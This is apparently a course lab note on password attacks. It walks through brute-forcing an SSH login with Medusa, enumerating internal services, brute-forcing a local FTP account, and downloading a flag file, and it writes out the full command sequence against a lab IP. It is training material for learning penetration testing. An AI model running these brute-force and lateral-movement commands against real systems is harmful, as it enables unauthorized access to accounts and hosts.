# NOTE — Web Services (SSH + FTP Brute Forcing with Medusa)

## ID
517

## Module
Password Attacks

## Kind
notes

## Title
Section 10 — Web Services (SSH + FTP Brute Forcing)

## Description
Use Medusa to brute‑force an SSH service, pivot to enumerate internal FTP, then crack the FTP password and retrieve the flag.

## Tags
medusa, ssh, ftp, pivoting, brute-forcing, internal-enumeration

## Commands
- `medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3`
- `ssh sshuser@<IP> -p <PORT>`
- `netstat -tulpn | grep LISTEN`
- `nmap localhost`
- `medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5`
- `ftp ftp://ftpuser:<PASSWORD>@localhost`
- `get flag.txt`
- `cat flag.txt`

## What This Section Covers
After cracking an SSH password with Medusa, you gain initial access. Inside the compromised host, you enumerate listening services with `netstat` and `nmap`, discovering an FTP server on port 21. Using Medusa again (now targeting localhost), you brute‑force FTP credentials for the `ftpuser` account. Successful login allows you to download and read `flag.txt`, demonstrating lateral movement and credential reuse.

## Methodology
1. **Brute‑force SSH** with Medusa using known username `sshuser` and the `2023-200_most_used_passwords.txt` wordlist.
2. **SSH into the target** with the cracked password.
3. **Enumerate internal services** — run `netstat -tulpn | grep LISTEN` and `nmap localhost` to find open ports (e.g., FTP on 21).
4. **Identify FTP username** — check `/home/` directory; `ftpuser` folder suggests the username.
5. **Brute‑force FTP** using Medusa against `127.0.0.1` with a password list (the module uses `2020-200_most_used_passwords.txt` in this lab).
6. **Connect via FTP** — use `ftp ftp://ftpuser:<cracked_pass>@localhost`.
7. **Download the flag** — `get flag.txt`, then `cat flag.txt`.

## Multi-step Workflow (example with live target)
```bash
# 1. SSH brute force from Pwnbox
medusa -h 154.57.164.77 -n 32661 -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3

# 2. SSH login
ssh sshuser@154.57.164.77 -p 32661
# (enter cracked password)

# 3. Inside the SSH session — enumerate
netstat -tulpn | grep LISTEN
nmap localhost

# 4. Check /home for FTP username hint
ls /home/

# 5. Brute‑force FTP from inside the target (need to transfer wordlist first)
# From Pwnbox, copy wordlist to target:
scp -P 32661 2020-200_most_used_passwords.txt sshuser@154.57.164.77:/tmp/
# Then from SSH session:
medusa -h 127.0.0.1 -u ftpuser -P /tmp/2020-200_most_used_passwords.txt -M ftp -t 5

# 6. FTP login and flag retrieval
ftp ftp://ftpuser:<cracked_ftp_pass>@localhost
# ftp> get flag.txt
# ftp> exit
cat flag.txt

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|login-brute-forcing]]  
← [[09-medusa]] | [[11-module-summary]] →
<!-- AUTO-LINKS-END -->
